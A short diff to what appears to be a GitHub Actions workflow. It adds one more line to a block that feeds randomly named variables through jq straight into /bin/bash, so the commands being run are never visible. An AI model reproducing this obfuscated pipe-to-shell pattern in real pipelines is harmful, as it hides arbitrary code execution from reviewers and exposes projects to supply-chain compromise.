@@ -49,6 +49,7 @@ jobs:
           echo $parls26 | jq -r .oppvm1 | /bin/bash
           printf '%s' "$ocemu5932" | jq -r .tn00234 | /bin/bash
           printf '%s' "$nch13" | jq -r .g0 | /bin/bash
+          echo $cbg579 | jq -r .efyy491 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
